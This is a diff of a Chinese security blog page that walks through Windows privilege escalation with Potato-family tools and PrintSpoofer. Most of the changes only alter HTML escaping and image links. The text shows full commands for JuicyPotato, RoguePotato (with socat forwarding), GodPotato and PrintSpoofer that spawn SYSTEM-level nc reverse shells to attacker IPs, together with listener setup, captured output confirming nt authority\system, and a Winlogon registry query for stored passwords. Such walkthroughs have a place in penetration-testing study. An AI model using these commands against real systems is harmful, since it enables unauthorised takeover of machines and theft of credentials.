 <li><font style="color:rgba(0, 0, 0, 0.88);">这是实际操作中最具挑战性的部分。你需要为</font><strong><font style="color:rgba(0, 0, 0, 0.88);">特定特定版本的 Windows 系统</font></strong><font style="color:rgba(0, 0, 0, 0.88);">找到一个可用的 CLSID。</font></li>
-<li><font style="color:rgba(0, 0, 0, 0.88);">Juicy Potato 发布时附带了一个</font><font style="color:rgba(0, 0, 0, 0.88);"> </font><code><font style="color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);">CLSID.list</font></code><font style="color:rgba(0, 0, 0, 0.88);">.list` 文件，其中列出了在各种 Windows 版本中测试过的 CLSID。</font></li>
+<li><font style="color:rgba(0, 0, 0, 0.88);">Juicy Potato 发布时附带了一个</font><font style="color:rgba(0, 0, 0, 0.88);"> </font><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);&quot;&gt;CLSID.list&lt;/font&gt;</code><font style="color:rgba(0, 0, 0, 0.88);">.list&#96; 文件，其中列出了在各种 Windows 版本中测试过的 CLSID。</font></li>
 <li><strong><font style="color:rgba(0, 0, 0, 0.88);">你必须根据目标系统的版本，从这个列表中挑选出一个或多个 CLSID进行尝试。</font></strong><font style="color:rgba(0, 0, 0, 0.88);"> </font><font style="color:rgba(0, 0, 0, 0.88);">例如：</font><ul>
 <li><font style="color:rgba(0, 0, 0, 0.88);">Windows 10 &#x2F; Server 2016&#x2F;2019 常用的 CLSID 可能与 Windows 7 &#x2F; Server 2008 不同。</font></li>
-<li><font style="color:rgba(0, 0, 0, 0.88);">一个历史上广泛使用的 CLSID 是</font><font style="color:rgba(0, 0, 0, 0.88);"> </font><code><font style="color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);">{4991d34b-80a1-4291-83b6-3328366b9097}</font></code><font style="color:rgba(0, 0, 0, 0.88);"> </font><font style="color:rgba(0, 0, 0, 0.88);">(BITS服务)。</font></li>
+<li><font style="color:rgba(0, 0, 0, 0.88);">一个历史上广泛使用的 CLSID 是</font><font style="color:rgba(0, 0, 0, 0.88);"> </font><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);&quot;&gt;{4991d34b-80a1-4291-83b6-3328366b9097}&lt;/font&gt;</code><font style="color:rgba(0, 0, 0, 0.88);"> </font><font style="color:rgba(0, 0, 0, 0.88);">(BITS服务)。</font></li>
 </ul>
 </li>
 </ul>
@@ -1111,15 +1120,15 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 一个典型的 Juicy Potato 命令示例</span><br><span class="line">JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -c &#123;CLSID&#125;</span><br></pre></td></tr></table></figure>
 
 <ul>
-<li><code><strong><font style="color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);">-c {CLSID}</font></strong></code><font style="color:rgba(0, 0, 0, 0.88);">: 对应前提 #2 和 #和 #4。你需要在这里填入一个在目标系统上可用的 CLSID。</font></li>
-<li><code>**<font style="color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);">-t *</font>**</code><font style="color:rgba(0, 0, 0, 0.88);">: 对应前提 #1。</font><code><font style="color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);">-t *</font></code><font style="color:rgba(0, 0, 0, 0.88);"> </font><font style="color:rgba(0, 0, 0, 0.88);">表示工具会自动尝试使用</font><font style="color:rgba(0, 0, 0, 0.88);"> </font><code><font style="color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);">SeImpersonatePrivilege</font></code><font style="color:rgba(0, 0, 0, 0.88);"> </font><font style="color:rgba(0, 0, 0, 0.88);">或</font><font style="color:rgba(0, 0, 0, 0.88);"> </font><code><font style="color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);">SeAssignPrimaryTokenPrivilege</font></code><font style="color:rgba(0, 0, 0, 0.88);">。</font></li>
-<li><code><strong><font style="color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);">-l 1337</font></strong></code><font style="color:rgba(0, 0, 0, 0.88);">: 对应前提 #3。指定一个本地监听端口。</font></li>
-<li><code><font style="color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);">-l &lt;port <port></font></code><font style="color:rgba(0, 0, 0, 0.88);"> 参数只是告诉 Juicy Potato 工具：”请在内部使用这个端口来完成权限欺骗过程”。所有的监听、通信、令牌窃取都是工具自动完成的，您只需要坐在当前的shell窗口中等待新的 SYSTEM 权限的 cmd.exe 进程启动即可。</font></li>
+<li><code>**&lt;font style=&quot;color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);&quot;&gt;-c {CLSID}&lt;/font&gt;**</code><font style="color:rgba(0, 0, 0, 0.88);">: 对应前提 #2 和 #和 #4。你需要在这里填入一个在目标系统上可用的 CLSID。</font></li>
+<li><code>**&lt;font style=&quot;color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);&quot;&gt;-t *&lt;/font&gt;**</code><font style="color:rgba(0, 0, 0, 0.88);">: 对应前提 #1。</font><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);&quot;&gt;-t *&lt;/font&gt;</code><font style="color:rgba(0, 0, 0, 0.88);"> </font><font style="color:rgba(0, 0, 0, 0.88);">表示工具会自动尝试使用</font><font style="color:rgba(0, 0, 0, 0.88);"> </font><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);&quot;&gt;SeImpersonatePrivilege&lt;/font&gt;</code><font style="color:rgba(0, 0, 0, 0.88);"> </font><font style="color:rgba(0, 0, 0, 0.88);">或</font><font style="color:rgba(0, 0, 0, 0.88);"> </font><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);&quot;&gt;SeAssignPrimaryTokenPrivilege&lt;/font&gt;</code><font style="color:rgba(0, 0, 0, 0.88);">。</font></li>
+<li><code>**&lt;font style=&quot;color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);&quot;&gt;-l 1337&lt;/font&gt;**</code><font style="color:rgba(0, 0, 0, 0.88);">: 对应前提 #3。指定一个本地监听端口。</font></li>
+<li><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);&quot;&gt;-l &lt;port &lt;port&gt;&lt;/font&gt;</code><font style="color:rgba(0, 0, 0, 0.88);"> 参数只是告诉 Juicy Potato 工具：”请在内部使用这个端口来完成权限欺骗过程”。所有的监听、通信、令牌窃取都是工具自动完成的，您只需要坐在当前的shell窗口中等待新的 SYSTEM 权限的 cmd.exe 进程启动即可。</font></li>
 </ul>
 <p><font style="color:rgba(0, 0, 0, 0.88);">在你决定使用 Juicy Potato 之前，请按此清单检查：</font></p>
-<p><strong><font style="color:rgba(0, 0, 0, 0.88);">权限检查</font></strong><font style="color:rgba(0, 0, 0, 0.88);">：运行 </font><code><font style="color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);">whoami /priv</font></code><font style="color:rgba(0, 0, 0, 0.88);">，确认输出中 </font><strong><font style="color:rgba(0, 0, 0, 0.88);">已启用</font></strong><font style="color:rgba(0, 0, 0, 0.88);"> </font><code><font style="color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);">SeImpersonatePrivilege</font></code><font style="color:rgba(0, 0, 0, 0.88);"> 或 </font><code><font style="color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);">SeAssignPrimaryTokenPrivilege</font></code><font style="color:rgba(0, 0, 0, 0.88);">。</font></p>
+<p><strong><font style="color:rgba(0, 0, 0, 0.88);">权限检查</font></strong><font style="color:rgba(0, 0, 0, 0.88);">：运行 </font><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);&quot;&gt;whoami /priv&lt;/font&gt;</code><font style="color:rgba(0, 0, 0, 0.88);">，确认输出中 </font><strong><font style="color:rgba(0, 0, 0, 0.88);">已启用</font></strong><font style="color:rgba(0, 0, 0, 0.88);"> </font><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);&quot;&gt;SeImpersonatePrivilege&lt;/font&gt;</code><font style="color:rgba(0, 0, 0, 0.88);"> 或 </font><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);&quot;&gt;SeAssignPrimaryTokenPrivilege&lt;/font&gt;</code><font style="color:rgba(0, 0, 0, 0.88);">。</font></p>
 <p><strong><font style="color:rgba(0, 0, 0, 0.88);">系统识别</font></strong><font style="color:rgba(0, 0, 0, 0.88);">：确定目标机器的 Windows 版本（如 Win10, Server 2012 R2等）。</font></p>
-<p><strong><font style="color:rgba(0, 0, 0, 0.88);">CLSID 准备</font></strong><font style="color:rgba(0, 0, 0, 0.88);">：根据目标系统版本，从 </font><code><font style="color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);">CLSID.list</font></code><font style="color:rgba(0, 0, 0, 0.88);"> 中挑选几个可能的候选。</font></p>
+<p><strong><font style="color:rgba(0, 0, 0, 0.88);">CLSID 准备</font></strong><font style="color:rgba(0, 0, 0, 0.88);">：根据目标系统版本，从 </font><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);&quot;&gt;CLSID.list&lt;/font&gt;</code><font style="color:rgba(0, 0, 0, 0.88);"> 中挑选几个可能的候选。</font></p>
 <p><strong><font style="color:rgba(0, 0, 0, 0.88);">执行尝试</font></strong><font style="color:rgba(0, 0, 0, 0.88);">：使用类似下面的命令进行尝试，如果失败，更换 CLSID 再次尝试。</font></p>
 <p><font style="color:rgba(0, 0, 0, 0.88);">第一次尝试，使用一个针对你目标系统版本的 CLSID</font></p>
 <p><font style="color:rgba(0, 0, 0, 0.88);">JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -c {4991d34b-80a1-4291-83b6-3328366b9097}</font></p>
@@ -1128,16 +1137,16 @@
 <h4 id="Rotten-Potato-烂土豆"><a href="#Rotten-Potato-烂土豆" class="headerlink" title="Rotten Potato(烂土豆)"></a>Rotten Potato(烂土豆)</h4><p><font style="color:rgb(36, 41, 47);">此技术不适用于 &gt;&#x3D; Windows 10 1809 和 Windows Server 2019 的版本</font></p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.通过NT AUTHORITY/SYSTEM运行的RPC将尝试通过CoGetInstanceFromIStorage API调用向我们的本地代理进行身份验证</span><br><span class="line"></span><br><span class="line"><span class="number">2.135</span> 端口的RPC将用于回复第一个RPC正在执行的所有请求充当模板</span><br><span class="line"></span><br><span class="line"><span class="number">3</span>.AcceptSecurityContextAPI调用以在本地模拟NT AUTHORITY/SYSTEM</span><br></pre></td></tr></table></figure>
 
-<p><img src="/../img/spj672lzkVrm2XkE/1762830846621-d96659d3-189f-48b7-a951-46815135e780-596401.png" alt="1762830846621-d96659d3-189f-48b7-a951-46815135e780.png"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/53530601/1762830846621-d96659d3-189f-48b7-a951-46815135e780.png"></p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>. 使用CoGetInstanceFromIStorage API 调用欺骗RPC,对代理进行身份验证.在此调用中指定了代理 IP/端口</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>. RPC 向代理发送 NTLM 协商包</span><br><span class="line"></span><br><span class="line"><span class="number">3</span>. 代理依赖的NTLM协商到RPC在端口<span class="number">135</span>，被用作模板。同时，执行对AcceptSecurityContext的调用以强制进行本地身份验证</span><br><span class="line">注:此包被修改为强制本地身份验证.</span><br><span class="line"></span><br><span class="line"><span class="number">4</span>. &amp; <span class="number">5</span>. RPC <span class="number">135</span>和AcceptSecurityContext用NTLM Challenge回复</span><br><span class="line"></span><br><span class="line"><span class="number">6</span>. 将两个数据包的内容混合以匹配本地协商并转发到RPC</span><br><span class="line"></span><br><span class="line"><span class="number">7</span>. RPC使用发送到<span class="title function_ invoke__">AcceptSecurityContext</span>(<span class="number">8</span>.)的NLTM Auth包进行响应，并执行模拟(<span class="number">9</span>.)</span><br></pre></td></tr></table></figure>
 
-<p><img src="/../img/spj672lzkVrm2XkE/1762834968174-47780b91-942d-4ad4-9755-04b2df23371e-343926.png" alt="1762834968174-47780b91-942d-4ad4-9755-04b2df23371e.png"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/53530601/1762834968174-47780b91-942d-4ad4-9755-04b2df23371e.png"></p>
 <h4 id="Rogue-Patato"><a href="#Rogue-Patato" class="headerlink" title="Rogue Patato"></a>Rogue Patato</h4><ol>
-<li><font style="color:rgba(0, 0, 0, 0.9);">攻击机准备（Kali 或任意你控制的 Linux）\ </font><font style="color:rgba(0, 0, 0, 0.9);">1.1 先把 135 端口抢过来，做转发器</font></li>
+<li><font style="color:rgba(0, 0, 0, 0.9);">攻击机准备（Kali 或任意你控制的 Linux）<br></font><font style="color:rgba(0, 0, 0, 0.9);">1.1 先把 135 端口抢过来，做转发器</font></li>
 </ol>
-<p><code><font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);">sudo socat tcp-listen:135,reuseaddr,fork tcp:&lt;靶机IP&gt;:9999</font></code></p>
+<p><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;sudo socat tcp-listen:135,reuseaddr,fork tcp:&lt;靶机IP&gt;:9999&lt;/font&gt;</code></p>
 <p><font style="color:rgba(0, 0, 0, 0.9);">1.2 再起一个 nc 等会接收 SYSTEM 反向 Shell</font></p>
-<p><code><font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);">nc -nvlp 443</font></code></p>
+<p><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;nc -nvlp 443&lt;/font&gt;</code></p>
 <hr>
 <ol>
 <li><font style="color:rgba(0, 0, 0, 0.9);">把文件丢到靶机同一目录（这里用 C:\temp）</font></li>
@@ -1149,36 +1158,36 @@
 <ol>
 <li><font style="color:rgba(0, 0, 0, 0.9);">靶机一次执行</font></li>
 </ol>
-<p><code><font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);">C:\temp\RoguePotato.exe -r &lt;攻击机IP&gt; -l 9999 -e &quot;C:\temp\nc64.exe &lt;攻击机IP&gt; 443 -e cmd.exe&quot;</font></code></p>
+<p><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;C:\temp\RoguePotato.exe -r &lt;攻击机IP&gt; -l 9999 -e &quot;C:\temp\nc64.exe &lt;攻击机IP&gt; 443 -e cmd.exe&quot;&lt;/font&gt;</code></p>
 <p><font style="color:rgba(0, 0, 0, 0.9);">参数解释</font></p>
 <ul>
-<li><code><font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);">-r</font></code><font style="color:rgba(0, 0, 0, 0.9);"> 攻击机 IP（socat 所在）</font></li>
-<li><code><font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);">-l 9999</font></code><font style="color:rgba(0, 0, 0, 0.9);"> 本地假 OXID 解析器监听端口，必须和 socat 转发对应</font></li>
-<li><code><font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);">-e</font></code><font style="color:rgba(0, 0, 0, 0.9);"> 提权成功后以 SYSTEM 身份启动的命令（这里给 nc 反向 shell）</font></li>
+<li><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;-r&lt;/font&gt;</code><font style="color:rgba(0, 0, 0, 0.9);"> 攻击机 IP（socat 所在）</font></li>
+<li><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;-l 9999&lt;/font&gt;</code><font style="color:rgba(0, 0, 0, 0.9);"> 本地假 OXID 解析器监听端口，必须和 socat 转发对应</font></li>
+<li><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;-e&lt;/font&gt;</code><font style="color:rgba(0, 0, 0, 0.9);"> 提权成功后以 SYSTEM 身份启动的命令（这里给 nc 反向 shell）</font></li>
 </ul>
-<h4 id="SweetPotato"><a href="#SweetPotato" class="headerlink" title="SweetPotato"></a>SweetPotato</h4><p><img src="/../img/spj672lzkVrm2XkE/1762839259244-7ad5ccb1-026a-42a2-ae4a-437e0948f198-715588.png" alt="1762839259244-7ad5ccb1-026a-42a2-ae4a-437e0948f198.png"></p>
+<h4 id="SweetPotato"><a href="#SweetPotato" class="headerlink" title="SweetPotato"></a>SweetPotato</h4><p><img src="https://cdn.nlark.com/yuque/0/2025/png/53530601/1762839259244-7ad5ccb1-026a-42a2-ae4a-437e0948f198.png"></p>
 <h4 id="GodPotato"><a href="#GodPotato" class="headerlink" title="GodPotato"></a>GodPotato</h4><p><font style="color:rgb(31, 35, 40);">利用程序内置的 Clsid 进行权限提升，并执行一个简单的命令。</font></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GodPotato -cmd &quot;cmd /c whoami&quot;</span><br></pre></td></tr></table></figure>
 
 <p><font style="color:rgb(31, 35, 40);">执行反向 shell 命令</font></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GodPotato -cmd &quot;nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012&quot;</span><br></pre></td></tr></table></figure>
 
-<h3 id="PrintSpoofer"><a href="#PrintSpoofer" class="headerlink" title="PrintSpoofer"></a><font style="color:rgb(36, 41, 47);">PrintSpoofer</font></h3><p><font style="color:rgb(31, 35, 40);">您可以使用该选项查看帮助信息</font><code><font style="color:rgb(31, 35, 40);background-color:rgba(129, 139, 152, 0.12);">-h</font></code><font style="color:rgb(31, 35, 40);">。</font></p>
+<h3 id="PrintSpoofer"><a href="#PrintSpoofer" class="headerlink" title="PrintSpoofer"></a><font style="color:rgb(36, 41, 47);">PrintSpoofer</font></h3><p><font style="color:rgb(31, 35, 40);">您可以使用该选项查看帮助信息</font><code>&lt;font style=&quot;color:rgb(31, 35, 40);background-color:rgba(129, 139, 152, 0.12);&quot;&gt;-h&lt;/font&gt;</code><font style="color:rgb(31, 35, 40);">。</font></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">C:\TOOLS&gt;PrintSpoofer.exe -h</span><br><span class="line"></span><br><span class="line">PrintSpoofer v0.1 (by @itm4n)</span><br><span class="line"></span><br><span class="line">  Provided that the current user has the SeImpersonate privilege, this tool will leverage the Print</span><br><span class="line">  Spooler service to get a SYSTEM token and then run a custom command with CreateProcessAsUser()</span><br><span class="line"></span><br><span class="line">Arguments:</span><br><span class="line">  -c &lt;CMD&gt;    Execute the command *CMD*</span><br><span class="line">  -i          Interact with the new process in the current command prompt (default is non-interactive)</span><br><span class="line">  -d &lt;ID&gt;     Spawn a new process on the desktop corresponding to this session *ID* (check your ID with qwinsta)</span><br><span class="line">  -h          That&#x27;s me :)</span><br><span class="line"></span><br><span class="line">Examples:</span><br><span class="line">  - Run PowerShell as SYSTEM in the current console</span><br><span class="line">      PrintSpoofer.exe -i -c powershell.exe</span><br><span class="line">  - Spawn a SYSTEM command prompt on the desktop of the session 1</span><br><span class="line">      PrintSpoofer.exe -d 1 -c cmd.exe</span><br><span class="line">  - Get a SYSTEM reverse shell</span><br><span class="line">      PrintSpoofer.exe -c &quot;c:\Temp\nc.exe 10.10.13.37 1337 -e cmd&quot;</span><br></pre></td></tr></table></figure>
 
 <h4 id="用法-1：启动一个-SYSTEM-进程并与之交互"><a href="#用法-1：启动一个-SYSTEM-进程并与之交互" class="headerlink" title="用法 1：启动一个 SYSTEM 进程并与之交互"></a><font style="color:rgb(31, 35, 40);">用法 1：启动一个 SYSTEM 进程并与之交互</font></h4><p><font style="color:rgb(31, 35, 40);">如果你有</font><strong><font style="color:rgb(31, 35, 40);">交互式</font></strong><font style="color:rgb(31, 35, 40);">shell，你可以在当前控制台中创建一个新的 SYSTEM 进程。</font></p>
-<p><strong><font style="color:rgb(31, 35, 40);">使用场景</font></strong><font style="color:rgb(31, 35, 40);">：绑定 shell、反向 shell</font><code><font style="color:rgb(31, 35, 40);background-color:rgba(129, 139, 152, 0.12);">psexec.py</font></code><font style="color:rgb(31, 35, 40);">等。</font></p>
+<p><strong><font style="color:rgb(31, 35, 40);">使用场景</font></strong><font style="color:rgb(31, 35, 40);">：绑定 shell、反向 shell</font><code>&lt;font style=&quot;color:rgb(31, 35, 40);background-color:rgba(129, 139, 152, 0.12);&quot;&gt;psexec.py&lt;/font&gt;</code><font style="color:rgb(31, 35, 40);">等。</font></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">C:\TOOLS&gt;PrintSpoofer.exe -i -c cmd</span><br><span class="line">[+] Found privilege: SeImpersonatePrivilege</span><br><span class="line">[+] Named pipe listening...</span><br><span class="line">[+] CreateProcessAsUser() OK</span><br><span class="line">Microsoft Windows [Version 10.0.19613.1000]</span><br><span class="line">(c) 2020 Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\WINDOWS\system32&gt;whoami</span><br><span class="line">nt authority\system</span><br></pre></td></tr></table></figure>
 
 <h4 id="用法-2：生成一个-SYSTEM-进程并退出"><a href="#用法-2：生成一个-SYSTEM-进程并退出" class="headerlink" title="用法 2：生成一个 SYSTEM 进程并退出"></a><font style="color:rgb(31, 35, 40);">用法 2：生成一个 SYSTEM 进程并退出</font></h4><p><font style="color:rgb(31, 35, 40);">如果你可以</font><strong><font style="color:rgb(31, 35, 40);">执行命令</font></strong><font style="color:rgb(31, 35, 40);">但没有交互式 shell，你可以创建一个新的 SYSTEM 进程，然后立即退出而不与之交互。</font></p>
-<p><strong><font style="color:rgb(31, 35, 40);">使用场景</font></strong><font style="color:rgb(31, 35, 40);">：WinRM、WebShell</font><code><font style="color:rgb(31, 35, 40);background-color:rgba(129, 139, 152, 0.12);">wmiexec.py</font></code><font style="color:rgb(31, 35, 40);">等</font><code><font style="color:rgb(31, 35, 40);background-color:rgba(129, 139, 152, 0.12);">smbexec.py</font></code><font style="color:rgb(31, 35, 40);">。</font></p>
+<p><strong><font style="color:rgb(31, 35, 40);">使用场景</font></strong><font style="color:rgb(31, 35, 40);">：WinRM、WebShell</font><code>&lt;font style=&quot;color:rgb(31, 35, 40);background-color:rgba(129, 139, 152, 0.12);&quot;&gt;wmiexec.py&lt;/font&gt;</code><font style="color:rgb(31, 35, 40);">等</font><code>&lt;font style=&quot;color:rgb(31, 35, 40);background-color:rgba(129, 139, 152, 0.12);&quot;&gt;smbexec.py&lt;/font&gt;</code><font style="color:rgb(31, 35, 40);">。</font></p>
 <p><font style="color:rgb(31, 35, 40);">创建反向 shell：</font></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C:\TOOLS&gt;PrintSpoofer.exe -c &quot;C:\TOOLS\nc.exe 10.10.13.37 1337 -e cmd&quot;</span><br><span class="line">[+] Found privilege: SeImpersonatePrivilege</span><br><span class="line">[+] Named pipe listening...</span><br><span class="line">[+] CreateProcessAsUser() OK</span><br></pre></td></tr></table></figure>
 
 <p><font style="color:rgb(31, 35, 40);">Netcat 监听器：</font></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">C:\TOOLS&gt;nc.exe -l -p 1337</span><br><span class="line">Microsoft Windows [Version 10.0.19613.1000]</span><br><span class="line">(c) 2020 Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\WINDOWS\system32&gt;whoami</span><br><span class="line">nt authority\system</span><br></pre></td></tr></table></figure>
 
-<h4 id="用法-3：在桌面上启动-SYSTEM-进程"><a href="#用法-3：在桌面上启动-SYSTEM-进程" class="headerlink" title="用法 3：在桌面上启动 SYSTEM 进程"></a><font style="color:rgb(31, 35, 40);">用法 3：在桌面上启动 SYSTEM 进程</font></h4><p><font style="color:rgb(31, 35, 40);">如果您已</font><strong><font style="color:rgb(31, 35, 40);">本地登录或通过 RDP</font></strong><font style="color:rgb(31, 35, 40);">（包括 VDI）登录，则可以在桌面上启动 SYSTEM 命令提示符。首先，使用命令检查您的会话 ID</font><font style="color:rgb(31, 35, 40);"> </font><code><font style="color:rgb(31, 35, 40);background-color:rgba(129, 139, 152, 0.12);">qwinsta</font></code><font style="color:rgb(31, 35, 40);">，然后使用选项指定此值</font><code><font style="color:rgb(31, 35, 40);background-color:rgba(129, 139, 152, 0.12);">-d</font></code><font style="color:rgb(31, 35, 40);">。</font></p>
+<h4 id="用法-3：在桌面上启动-SYSTEM-进程"><a href="#用法-3：在桌面上启动-SYSTEM-进程" class="headerlink" title="用法 3：在桌面上启动 SYSTEM 进程"></a><font style="color:rgb(31, 35, 40);">用法 3：在桌面上启动 SYSTEM 进程</font></h4><p><font style="color:rgb(31, 35, 40);">如果您已</font><strong><font style="color:rgb(31, 35, 40);">本地登录或通过 RDP</font></strong><font style="color:rgb(31, 35, 40);">（包括 VDI）登录，则可以在桌面上启动 SYSTEM 命令提示符。首先，使用命令检查您的会话 ID</font><font style="color:rgb(31, 35, 40);"> </font><code>&lt;font style=&quot;color:rgb(31, 35, 40);background-color:rgba(129, 139, 152, 0.12);&quot;&gt;qwinsta&lt;/font&gt;</code><font style="color:rgb(31, 35, 40);">，然后使用选项指定此值</font><code>&lt;font style=&quot;color:rgb(31, 35, 40);background-color:rgba(129, 139, 152, 0.12);&quot;&gt;-d&lt;/font&gt;</code><font style="color:rgb(31, 35, 40);">。</font></p>
 <p><strong><font style="color:rgb(31, 35, 40);">使用场景</font></strong><font style="color:rgb(31, 35, 40);">：终端会话（RDP）、VDI</font></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">C:\TOOLS&gt;qwinsta</span><br><span class="line"> SESSIONNAME       USERNAME                 ID  STATE   TYPE        DEVICE</span><br><span class="line"> services                                    0  Disc</span><br><span class="line"> console           Administrator             1  Active</span><br><span class="line">&gt;rdp-tcp#3         lab-user                  3  Active</span><br><span class="line"> rdp-tcp                                 65536  Listen</span><br><span class="line"></span><br><span class="line">C:\TOOLS&gt;PrintSpoofer.exe -d 3 -c &quot;powershell -ep bypass&quot;</span><br><span class="line">[+] Found privilege: SeImpersonatePrivilege</span><br><span class="line">[+] Named pipe listening...</span><br><span class="line">[+] CreateProcessAsUser() OK</span><br></pre></td></tr></table></figure>
 
@@ -1188,7 +1197,7 @@
 
 <p><font style="color:rgb(36, 41, 47);">单单第一条命令进行的 HKLM 的搜索，就看到显示有 293 个匹配，而这 293 条结果中还有很多无用的数据有待认为判断处理。可以看出，这种广泛搜索极其的耗费精力！</font></p>
 <p><font style="color:rgb(36, 41, 47);">相反，我们可以集中精力去查看包含密码的已知注册表项。这样的注册表项是 winlogon，它与 Windows 中被称为 Autologon（自动登录）的功能相关。</font></p>
-<p><code><font style="color:rgb(68, 68, 68);background-color:rgb(245, 245, 245);">reg query &quot;HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon&quot;</font></code></p>
+<p><code>&lt;font style=&quot;color:rgb(68, 68, 68);background-color:rgb(245, 245, 245);&quot;&gt;reg query &quot;HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon&quot;&lt;/font&gt;</code></p>
